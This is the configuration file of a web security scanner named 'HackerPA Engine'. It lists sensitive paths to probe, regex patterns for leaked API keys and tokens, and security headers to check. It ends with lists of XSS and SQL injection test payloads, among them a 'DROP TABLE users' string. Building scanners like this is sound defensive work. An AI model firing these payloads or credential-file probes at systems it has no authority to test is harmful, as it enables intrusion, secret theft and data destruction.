"""
HackerPA Engine - Configuration
"""

import os

# Firebase
_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
FIREBASE_CREDENTIALS_PATH = os.environ.get(
    "FIREBASE_CREDENTIALS_PATH",
    os.path.join(_PROJECT_ROOT, "serviceAccountKey.json")
)

# Scan Settings
SCAN_TIMEOUT = int(os.environ.get("SCAN_TIMEOUT", "300"))  # 5 min per scanner
MAX_CONCURRENT_SCANS = int(os.environ.get("MAX_CONCURRENT_SCANS", "3"))
REQUEST_DELAY = float(os.environ.get("REQUEST_DELAY", "0.5"))  # delay between requests

# User Agent
USER_AGENT = "HackerPA Security Scanner/1.0"

# Directory Scanner - paths to check
SENSITIVE_PATHS = [
    "/.env",
    "/.env.local",
    "/.env.production",
    "/.git/config",
    "/.git/HEAD",
    "/.gitignore",
    "/wp-admin/",
    "/admin/",
    "/administrator/",
    "/.htaccess",
    "/web.config",
    "/robots.txt",
    "/sitemap.xml",
    "/.well-known/security.txt",
    "/backup/",
    "/backups/",
    "/dump.sql",
    "/database.sql",
    "/.DS_Store",
    "/thumbs.db",
    "/composer.json",
    "/package.json",
    "/.npmrc",
    "/Dockerfile",
    "/docker-compose.yml",
    "/.dockerenv",
    "/server-status",
    "/server-info",
    "/phpinfo.php",
    "/info.php",
    "/test.php",
    "/config.php",
    "/config.yml",
    "/config.json",
    "/api/",
    "/api/docs",
    "/swagger.json",
    "/openapi.json",
    "/.vscode/",
    "/.idea/",
    "/debug/",
    "/trace/",
    "/console/",
]

# Secrets Scanner - patterns to look for in frontend JS/HTML
SECRET_PATTERNS = [
    r'(?i)api[_-]?key\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)api[_-]?secret\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)access[_-]?token\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)auth[_-]?token\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)secret[_-]?key\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)private[_-]?key\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)password\s*[:=]\s*["\']([^"\']{3,})["\']',
    r'(?i)passwd\s*[:=]\s*["\']([^"\']{3,})["\']',
    r'(?i)db[_-]?password\s*[:=]\s*["\']([^"\']{3,})["\']',
    r'(?i)database[_-]?url\s*[:=]\s*["\']([^"\']{8,})["\']',
    r'(?i)mongodb(\+srv)?://[^\s"\']+',
    r'(?i)postgres(ql)?://[^\s"\']+',
    r'(?i)mysql://[^\s"\']+',
    r'(?i)redis://[^\s"\']+',
    r'(?i)amqp://[^\s"\']+',
    r'(?i)smtp://[^\s"\']+',
    r'AIza[0-9A-Za-z_-]{35}',                      # Google API Key
    r'(?i)sk[-_]live[-_][0-9a-zA-Z]{24,}',         # Stripe Secret Key
    r'(?i)pk[-_]live[-_][0-9a-zA-Z]{24,}',         # Stripe Publishable Key
    r'(?i)sk[-_]test[-_][0-9a-zA-Z]{24,}',         # Stripe Test Key
    r'ghp_[0-9a-zA-Z]{36}',                         # GitHub Personal Access Token
    r'github_pat_[0-9a-zA-Z_]{82}',                 # GitHub Fine-grained Token
    r'xox[baprs]-[0-9a-zA-Z-]+',                    # Slack Token
    r'(?i)aws[_-]?access[_-]?key[_-]?id\s*[:=]\s*["\']?[A-Z0-9]{20}',  # AWS Access Key
    r'(?i)aws[_-]?secret\s*[:=]\s*["\']?[A-Za-z0-9/+=]{40}',           # AWS Secret
    r'-----BEGIN (RSA |EC )?PRIVATE KEY-----',       # Private Keys
    r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',  # JWT Tokens
]

# Security Headers to check
SECURITY_HEADERS = {
    "Strict-Transport-Security": {
        "required": True,
        "severity": "high",
        "description": "HSTS protege contra ataques man-in-the-middle forcando HTTPS",
    },
    "Content-Security-Policy": {
        "required": True,
        "severity": "high",
        "description": "CSP previne XSS controlando quais recursos podem ser carregados",
    },
    "X-Content-Type-Options": {
        "required": True,
        "severity": "medium",
        "description": "Previne MIME-type sniffing",
        "expected": "nosniff",
    },
    "X-Frame-Options": {
        "required": True,
        "severity": "medium",
        "description": "Protege contra clickjacking",
    },
    "X-XSS-Protection": {
        "required": False,
        "severity": "low",
        "description": "Filtro XSS do navegador (legado, CSP e preferivel)",
    },
    "Referrer-Policy": {
        "required": True,
        "severity": "low",
        "description": "Controla quais informacoes de referrer sao enviadas",
    },
    "Permissions-Policy": {
        "required": True,
        "severity": "medium",
        "description": "Controla quais APIs do navegador o site pode usar",
    },
    "X-Permitted-Cross-Domain-Policies": {
        "required": False,
        "severity": "low",
        "description": "Controla como Flash e PDFs podem acessar o dominio",
    },
    "Cross-Origin-Opener-Policy": {
        "required": False,
        "severity": "low",
        "description": "Isola o contexto de navegacao",
    },
    "Cross-Origin-Resource-Policy": {
        "required": False,
        "severity": "low",
        "description": "Protege recursos contra leitura cross-origin",
    },
}

# XSS Payloads for testing
XSS_PAYLOADS = [
    '<script>alert("HackerPA")</script>',
    '"><script>alert("HackerPA")</script>',
    "'-alert('HackerPA')-'",
    '<img src=x onerror=alert("HackerPA")>',
    '<svg onload=alert("HackerPA")>',
    '"><img src=x onerror=alert("HackerPA")>',
    "javascript:alert('HackerPA')",
    '<body onload=alert("HackerPA")>',
    '<iframe src="javascript:alert(\'HackerPA\')">',
    "{{constructor.constructor('alert(1)')()}}",
]

# SQLi Payloads for testing
SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "1' ORDER BY 1--",
    "1' ORDER BY 100--",
    "1 UNION SELECT NULL--",
    "1' UNION SELECT NULL--",
    "' AND 1=1--",
    "' AND 1=2--",
    "1; DROP TABLE users--",
    "' OR 1=1#",
    "admin'--",
    "1' WAITFOR DELAY '0:0:5'--",
    "1' AND SLEEP(5)--",
]
